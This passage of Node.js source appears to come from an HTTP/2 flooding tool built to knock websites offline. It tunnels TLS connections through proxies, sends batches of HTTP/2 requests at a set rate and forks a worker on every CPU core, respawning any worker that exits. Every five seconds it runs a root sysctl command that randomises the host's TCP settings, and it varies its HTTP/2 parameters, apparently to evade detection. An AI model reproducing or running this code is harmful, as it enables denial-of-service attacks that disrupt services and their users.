                        streamId += 2;

                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        setTimeout(() => {

                        main()
                    }, 1000 / ratelimit);
                    })
                }
                main()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })

    
    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
        if (error) {
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`SENT`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let consssas = 0

    let someee = setInterval(() => {
        if (consssas < 30000) {
            consssas++

        } else {
            clearInterval(someee)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}